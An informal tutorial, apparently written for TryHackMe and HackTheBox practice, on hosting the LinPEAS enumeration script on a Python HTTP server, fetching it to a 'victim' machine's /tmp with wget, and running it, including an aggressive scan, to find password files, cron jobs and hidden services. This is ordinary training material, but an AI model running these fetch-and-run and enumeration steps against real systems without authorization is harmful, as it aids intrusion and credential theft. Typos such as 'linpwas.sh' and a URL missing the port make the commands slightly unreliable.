HOW TO USE LINPEAS


fist what we need to do is upload linpeas to the victim machine via starting a python server or apache server! we will be useing a python simple http server for todays example!

if your on TryHackMe or HackTheBox Do The Following!

make sure you are currently in the "privilege-escalation-awesome-scripts-suite/linPEAS" Directory!

in there you will find a few files lets focus on the file called "linpeas.sh".

linpeas.sh is the file we will be uploading to the victim machine so inorder to do that we have to make sure that we are in the machine someway.

now to start a simply python server simple do "python3 -m http.server" and you should get a result of

(http://0.0.0.0:8000) that means that your simple python http server had started!! now for the file upload

now when on TryHackme or HackTheBox you do the same steps do "ifconfig tun0" THis command will show your your "openvpn" IP adress or your TryhackMe or HackTheBox IP adress  now for the file upload (also make sure that you use th python command in the same directory that your linpeas.sh file is) now in the victim machine navigate to the /tmp folder and do the following command

"wget http://<YOUR_IP>/linpwas.sh" then it should download in the victim machines /tmp directory!

=============================================HOW TO SETUP===========================================

now for the setup!

in the /tmp directory in the victim machine the file "linpeas.sh" should be there but we need to give it executable permissions first or else we wont be able to use it!

to do this in the victim machine type "chmod +x linpeas.sh"

now if you do "ls" in the victim machine the file chould look green or be a different color and if it isnt just do the following

./linpeas.sh

after you run the file dont touch ANYTHING this will audit the while machine and show you things that might be hidden to the naked eye like crontab proccesses, password files, hidden services (internal), etc

there is also a help menu to this tool to see it just do the following

./linpeas.sh --help


this will show you a bunch if things called switched you can use this along with your command to extend your deep search or what ever it tells you just read :P

if you want to do a agressive scan on the machine the swtich for that is "-a" or "-A"


to use it in your command simply do the following!

./linpeas.sh -a! have fun :P
